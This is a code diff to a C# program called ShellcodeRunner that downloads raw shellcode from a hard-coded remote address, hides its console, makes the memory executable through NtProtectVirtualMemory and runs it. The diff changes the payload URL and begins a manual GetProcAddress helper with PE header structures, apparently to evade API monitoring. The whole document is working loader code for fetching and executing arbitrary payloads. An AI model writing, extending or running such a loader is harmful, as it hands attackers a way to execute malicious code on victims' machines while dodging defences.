@@ -5,12 +5,46 @@ using System.Runtime.InteropServices;
 
 namespace ShellcodeRunner
 {
-    class Program
+    public class Program
     {
+        public delegate IntPtr ARPROC(IntPtr hModule, string lpProcName);
+
+        public class GetProcAddressHelper
+        {
+            [StructLayout(LayoutKind.Sequential)]
+            public struct IMAGE_DOS_HEADER
+            {
+                public ushort e_magic; // Magic number
+                public ushort e_cblp; // Bytes on last page of file
+                public ushort e_cp; // Pages in file
+                public ushort e_crlc; // Relocations
+                public ushort e_cparhdr; // Size of header in paragraphs
+                public ushort e_minalloc; // Minimum extra paragraphs needed
+                public ushort e_maxalloc; // Maximum extra paragraphs needed
+                public ushort e_ss; // Initial (relative) SS value
+                public ushort e_sp; // Initial SP value
+                public ushort e_csum; // Checksum
+                public ushort e_ip; // Initial IP value
+                public ushort e_cs; // Initial (relative) CS value
+                public ushort e_lfarlc; // File address of relocation table
+                public ushort e_ovno; // Overlay number
+                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+                public ushort[] e_res1; // Reserved words
+                public ushort e_oemid; // OEM identifier (for e_oeminfo)
+                public ushort e_oeminfo; // OEM information; e_oemid specific
+                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
+                public ushort[] e_res2; // Reserved words
+                public int e_lfanew; // File address of new exe header
+            }
+
+            // Add other structure definitions, DllImports, and methods here
+        }
+
         // NT API Constants
         const uint MEM_COMMIT = 0x00001000;
         const uint MEM_RESERVE = 0x00002000;
         const uint PAGE_EXECUTE_READWRITE = 0x40;
+        const uint PAGE_EXECUTE_READ = 0x20;
         const uint CREATE_SUSPENDED = 0x00000004;
         const uint WAIT_INFINITE = 0xFFFFFFFF;
 
@@ -47,7 +81,7 @@ namespace ShellcodeRunner
             NtProtectVirtualMemoryDelegate ntProtectVirtualMemory = (NtProtectVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(ntProtectVirtualMemoryAddr, typeof(NtProtectVirtualMemoryDelegate));
 
             WebClient client = new WebClient();
-            string url = "http://192.168.1.30:8080/code.txt";
+            string url = "http://192.168.1.29:9090/shellcode.md";
             byte[] shellcode = client.DownloadData(url);
 
             FreeConsole();
@@ -63,7 +97,7 @@ namespace ShellcodeRunner
 
             // Change the memory protection to read-execute using NtProtectVirtualMemory
             uint oldProtect = 0;
-            status = ntProtectVirtualMemory(GetCurrentProcess(), ref allocMemAddress, ref size, 0x20, out oldProtect);  // NewProtect = PAGE_EXECUTE_READ
+            status = ntProtectVirtualMemory(GetCurrentProcess(), ref allocMemAddress, ref size, PAGE_EXECUTE_READ, out oldProtect);
 
             IntPtr threadHandle = IntPtr.Zero;
 
